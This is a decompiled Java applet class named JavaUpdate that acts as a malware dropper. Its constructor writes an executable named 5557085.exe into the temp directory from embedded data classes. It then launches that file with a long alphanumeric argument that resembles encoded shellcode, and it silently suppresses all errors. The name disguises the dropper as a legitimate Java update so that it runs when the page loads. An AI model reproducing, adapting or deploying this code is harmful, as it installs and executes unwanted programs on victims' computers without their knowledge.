import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class JavaUpdate extends Applet
{
    public JavaUpdate() {
        try {
            final File file = new File(System.getProperty("java.io.tmpdir") + "5557085.exe");
            final String[] array = new String[2];
            if (!file.exists()) {
                array[0] = file.getAbsolutePath();
                array[1] = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIKLjHniuPUPs0qpMYXeUaKb1tLKqBvPLKqBvllKV2r4Nk42gXFox7PJ16DqkOUaiPNLEle11ls2VLQ0zaXOdMeQO7YrhpRrbwLKaB6plKPBEls1N0nkSp2XMUyPCDCzWqN0v0nkBhR8nkbx5pfaXSys5l79LKudNk7qIF4qiouaYPllIQHO4Mc1XGfXYpQeXtUSCM8x5kqmtdaekRqHlKQHq47q8SQvlKDLRklKCheLc1YCLKWtNk6azpmYpDddwTaKqKsQqIaJCaio9pchaO1JLKR2xklFsm1xpnE5D4eP0ht7U9pnSYMYjFPT580L0wq6tGKOXU4qio2wrwrwBw2vsXgJ0Vt9Y7kOxUjKaOQKTq8Ibqf13ZC3Rq3aPh9kq07pgpaCV0phcgk9ooiVKO8UHkQXf9Dq8R62e8S0dry0k43bCbV2SabrF01xXkRu4nEk9on5Nio6cZdPCk2Hopdss05PNiM03Zc4bpSZ5Orv2H3EqVonlFKOHUtqYo0Wv7SgsgSfsXFMVfDXqkiokelE9P3Ewj0K1dtPxk8UJKQYhhlsio9oYoTog9pNw9QDBm7pU8jPH5LbaFIojucZ70phwpr0Wp5P1xuPgp70uPaGU8BxI4scIuioN5z3CcCcLIhgcgbHGpq030s063cfcX6rz6MYKRyo8UouyPadXMLK37EQXCneiP1e9u3hySjH0QkOYoYop65idndqdy04tnFQFStyFNFRp1UfC0AA";
                file.createNewFile();
                final DataOutputStream dataOutputStream = new DataOutputStream(new BufferedOutputStream(new FileOutputStream(file)));
                dataOutputStream.write(UpdateData0.data);
                dataOutputStream.write(UpdateData1.data);
                dataOutputStream.write(UpdateData2.data);
                dataOutputStream.write(UpdateData3.data);
                dataOutputStream.write(UpdateData4.data);
                dataOutputStream.write(UpdateData5.data);
                dataOutputStream.write(UpdateData6.data);
                dataOutputStream.write(UpdateData7.data);
                dataOutputStream.write(UpdateData8.data);
                dataOutputStream.write(UpdateData9.data);
                dataOutputStream.write(UpdateData10.data);
                dataOutputStream.flush();
                dataOutputStream.close();
                Runtime.getRuntime().exec(array);
            }
        }
        catch (Exception ex) {}
    }
}
